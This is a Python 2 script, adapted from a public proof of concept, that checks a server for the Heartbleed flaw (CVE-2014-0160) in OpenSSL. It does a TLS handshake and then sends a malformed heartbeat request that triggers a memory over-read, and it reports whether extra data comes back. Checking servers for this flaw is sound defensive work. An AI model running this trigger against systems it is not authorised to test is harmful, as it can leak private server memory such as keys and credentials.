#!/usr/bin/python

# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
# The author disclaims copyright to this source code.
#
# TLS version support by takeshix <takeshix@adversec.com>
#
# Minor changes to return all messages rather than print them by Jonathan Dieter (jdieter@lesbg.com)
# The author disclaims copyright to this source code.

import struct
import socket
import time
import select
import re

tls_versions = {0x01:'TLSv1.0',0x02:'TLSv1.1',0x03:'TLSv1.2'}

def hex2bin(arr):
    return ''.join('{:02x}'.format(x) for x in arr).decode('hex')

def build_client_hello(tls_ver):
    t = struct.pack("!I", int(time.time()))
    client_hello = [
    # TLS header ( 5 bytes)
    0x16, # Content type (0x16 for handshake)
    0x03, tls_ver, # TLS Version
    0x00, 0xdc, # Length
    # Handshake header
    0x01, # Type (0x01 for ClientHello)
    0x00, 0x00, 0xd8, # Length
    0x03, tls_ver, # TLS Version
    # Random (32 byte)
    ord(t[0]), ord(t[1]), ord(t[2]), ord(t[3]), 0x91, 0x92, 0x74, 0x1b,
    0xdc, 0x3c, 0xbf, 0x14, 0x12, 0x8a, 0x68, 0xa7,
    0xef, 0xb1, 0x34, 0xa4, 0xc4, 0x26, 0x1a, 0x55,
    0xa3, 0x91, 0x9d, 0xa7, 0x05, 0x23, 0x04, 0xfe,
    0x00, # Session ID length
    0x00, 0x66, # Cipher suites length
    # Cipher suites (51 suites)
    0xc0, 0x14, 0xc0, 0x0a, 0xc0, 0x22, 0xc0, 0x21,
    0x00, 0x39, 0x00, 0x38, 0x00, 0x88, 0x00, 0x87,
    0xc0, 0x0f, 0xc0, 0x05, 0x00, 0x35, 0x00, 0x84,
    0xc0, 0x12, 0xc0, 0x08, 0xc0, 0x1c, 0xc0, 0x1b,
    0x00, 0x16, 0x00, 0x13, 0xc0, 0x0d, 0xc0, 0x03,
    0x00, 0x0a, 0xc0, 0x13, 0xc0, 0x09, 0xc0, 0x1f,
    0xc0, 0x1e, 0x00, 0x33, 0x00, 0x32, 0x00, 0x9a,
    0x00, 0x99, 0x00, 0x45, 0x00, 0x44, 0xc0, 0x0e,
    0xc0, 0x04, 0x00, 0x2f, 0x00, 0x96, 0x00, 0x41,
    0xc0, 0x11, 0xc0, 0x07, 0xc0, 0x0c, 0xc0, 0x02,
    0x00, 0x05, 0x00, 0x04, 0x00, 0x15, 0x00, 0x12,
    0x00, 0x09, 0x00, 0x14, 0x00, 0x11, 0x00, 0x08,
    0x00, 0x06, 0x00, 0x03, 0x00, 0xff,
    0x01, # Compression methods length
    0x00, # Compression method (0x00 for NULL)
    0x00, 0x49, # Extensions length
    # Extension: ec_point_formats
    0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02,
    # Extension: elliptic_curves
    0x00, 0x0a, 0x00, 0x34, 0x00, 0x32, 0x00, 0x0e,
    0x00, 0x0d, 0x00, 0x19, 0x00, 0x0b, 0x00, 0x0c,
    0x00, 0x18, 0x00, 0x09, 0x00, 0x0a, 0x00, 0x16,
    0x00, 0x17, 0x00, 0x08, 0x00, 0x06, 0x00, 0x07,
    0x00, 0x14, 0x00, 0x15, 0x00, 0x04, 0x00, 0x05,
    0x00, 0x12, 0x00, 0x13, 0x00, 0x01, 0x00, 0x02,
    0x00, 0x03, 0x00, 0x0f, 0x00, 0x10, 0x00, 0x11,
    # Extension: SessionTicket TLS
    0x00, 0x23, 0x00, 0x00,
    # Extension: Heartbeat
    0x00, 0x0f, 0x00, 0x01, 0x01
    ]
    return client_hello

def build_heartbeat(tls_ver):
    heartbeat = [
    0x18, # Content Type (Heartbeat)
    0x03, tls_ver, # TLS version
    0x00, 0x03, # Length
    # Payload
    0x01, # Type (Request)
    0x40, 0x00 # Payload length
    ]
    return heartbeat

def hexdump(s):
    return ""
    vrb = ""
    for b in xrange(0, len(s), 16):
        lin = [c for c in s[b : b + 16]]
        hxdat = ' '.join('%02X' % ord(c) for c in lin)
        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
        vrb += '  %04x: %-48s %s\n' % (b, hxdat, pdat)
    vrb += '\n'
    return vrb

def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = ''
    remain = length
    while remain > 0:
        rtime = endtime - time.time()
        if rtime < 0:
            return None
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            data = s.recv(remain)
            # EOF?
            if not data:
                return None
            rdata += data
            remain -= len(data)
    return rdata

def recvmsg(s):
    vrb = ""
    hdr = recvall(s, 5)
    if hdr is None:
        vrb += 'Unexpected EOF receiving record header - server closed connection\n'
        return None, None, None, vrb
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recvall(s, ln, 10)
    if pay is None:
        vrb += 'Unexpected EOF receiving record payload - server closed connection\n'
        return None, None, None, vrb
    vrb += ' ... received message: type = %d, ver = %04x, length = %d\n' % (typ, ver, len(pay))
    return typ, ver, pay, vrb

def hit_hb(server, port):
    vrb = ""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    vrb += 'Connecting...\n'
    try:
        s.connect((server, port))
    except:
        return (2, "Unable to connect", vrb)

    supported = False

    for num in (0x03, 0x02, 0x01):
        tlsver = tls_versions[num]
        vrb += 'Sending Client Hello for {}...\n'.format(tlsver)

        try:
            s.send(hex2bin(build_client_hello(num)))
        except Exception, e:
            vrb += '%s\n' % e
            return (2, 'Error establishing a secure connection with the server.  Have you lost network connectivity?', vrb)
        vrb += 'Waiting for Server Hello...\n'
        while True:
            try:
                typ, ver, pay, new_vrb = recvmsg(s)
            except Exception, e:
                vrb += '%s\n' % e
                return (2, 'Error receiving response when trying to establish a secure connection to the server.  Have you lost network connectivity?', vrb)

            vrb += new_vrb
            if typ is None:
                vrb += 'Server closed connection without sending ServerHello for {}\n'.format(tlsver)
                continue
            if typ == 22 and ord(pay[0]) == 0x0E:
                vrb += 'Received Server Hello for {}\n'.format(tlsver)
                supported = num
                break
        if supported: break

    if not supported:
        vrb += "Server is not using any version of TLS that's supported"
        return (2, 'We were unable to establish a secure connection to the server.  This could be because the server isn\'t running any secure services, or there may have been some connection difficulties', vrb)

    vrb += 'Sending heartbeat request...\n'
    try:
        s.send(hex2bin(build_heartbeat(supported)))
        # Send twice for immediate response without timeout
        s.send(hex2bin(build_heartbeat(supported)))
    except Exception, e:
        vrb += '%s\n' % e
        return (2, 'Error sending heartbeat to the server.  Have you lost network connectivity?', vrb)

    while True:
        try:
            typ, ver, pay, new_vrb = recvmsg(s)
        except Exception, e:
            vrb += '%s\n' % e
            return (2, 'Error receiving response when trying to receive heartbeat from the server.  In this particular case, the most likely explanation is that you\'ve lost network connectivity', vrb)

        vrb += new_vrb
        if typ is None:
            return (0, 'Server is not vulnerable.  It ignored the malformed heartbeat message.', vrb)

        if typ == 24:
            vrb += 'Received heartbeat response:\n'
            vrb += hexdump(pay)
            if len(pay) > 3:
                return (1, 'WARNING: This server is vulnerable!  It returned extra data after receiving the malformed heartbeat message.', vrb)
            else:
                return (0, 'Server is not vulnerable.  It did not return extra data after receiving the malformed heartbeat message.', vrb)

        if typ == 21:
            vrb += 'Received alert:\n'
            vrb += hexdump(pay)
            return (0, 'Server is not vulnerable.  It returned an error after receiving the malformed heartbeat message.', vrb)

def main():
    import sys
    from optparse import OptionParser

    options = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
    options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')

    opts, args = options.parse_args()
    if len(args) < 1:
        options.print_help()
        return 3

    (retval, msg, verbose) = hit_hb(args[0], opts.port)
    print >> sys.stderr, verbose,
    print msg
    return retval

if __name__ == '__main__':
    import sys
    sys.exit(main())
